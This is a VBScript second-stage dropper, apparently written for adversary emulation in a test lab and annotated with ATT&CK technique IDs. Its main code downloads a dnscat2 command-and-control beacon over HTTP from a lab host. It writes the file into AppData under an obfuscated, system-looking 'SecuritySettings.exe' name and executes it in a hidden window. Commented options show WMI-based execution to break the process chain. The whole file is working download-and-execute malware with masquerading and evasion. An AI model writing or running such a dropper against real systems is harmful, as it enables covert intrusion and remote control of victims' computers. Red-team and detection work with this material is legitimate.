' =============================================================================
' stage2.vbs - VBS Stage 2 (executed in-memory inside mshta.exe via Execute)
'
' Techniques:
'   T1059.005  - Command and Scripting Interpreter: Visual Basic
'   T1105      - Ingress Tool Transfer (download beacon)
'   T1027.010  - Obfuscated Files or Information: Command Obfuscation
'   T1036.005  - Masquerading: Match Legitimate Resource Name or Location
'   T1047      - Windows Management Instrumentation (optional exec path)
'   T1564.003  - Hide Artifacts: Hidden Window
' =============================================================================

' T1027.010 - String obfuscation for target path
Dim oSh   : Set oSh = CreateObject("WScript.Shell")
Dim sDir  : sDir  = oSh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\"
Dim sName : sName = "Secu" & "ri" & "ty" & "Set" & "tings.exe"
Dim sDrop : sDrop = sDir & sName

' T1105 - Download beacon EXE via MSXML2.XMLHTTP
Dim sBeacon : sBeacon = "http://upload.testlab.local/uploads/dnscat2.exe"

Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", sBeacon, False
xhr.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
xhr.Send

If xhr.Status = 200 Then
    ' Write binary to disk via ADODB.Stream
    ' T1036.005 - Drop in AppData path with system-looking filename
    Dim stm : Set stm = CreateObject("ADODB.Stream")
    stm.Type = 1    ' adTypeBinary
    stm.Open
    stm.Write xhr.responseBody


    stm.SaveToFile sDrop, 2   ' adSaveCreateOverWrite
    stm.Close
    Set stm = Nothing

    ' -------------------------------------------------------------------------
    ' Execution options (uncomment one):
    ' -------------------------------------------------------------------------

    ' Option A: WScript.Shell.Run - parent = mshta.exe, hidden window
    ' T1564.003
    ' CreateObject("WScript.Shell").Run """" & sDrop & """", 0, False

    ' Option B: WMI Win32_Process.Create - parent = wmiprvse.exe (chain break)
    ' T1047
    ' Dim wmi : Set wmi = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    ' Dim pid : wmi.Create """" & sDrop & """", Null, Null, pid
    ' Set wmi = Nothing

    ' Option C: Shell.Application.ShellExecute - parent = mshta.exe
    ' T1218.005 (inherited context)
    CreateObject("Shell.Application").ShellExecute sDrop, "", sDir, "open", 0

End If

Set xhr = Nothing

' =============================================================================
' --- FOR TESTING: replace beacon download above with this block ---
' Just pops calc.exe to verify execution without a real payload
'
' CreateObject("WScript.Shell").Run "calc.exe", 0, False
' =============================================================================
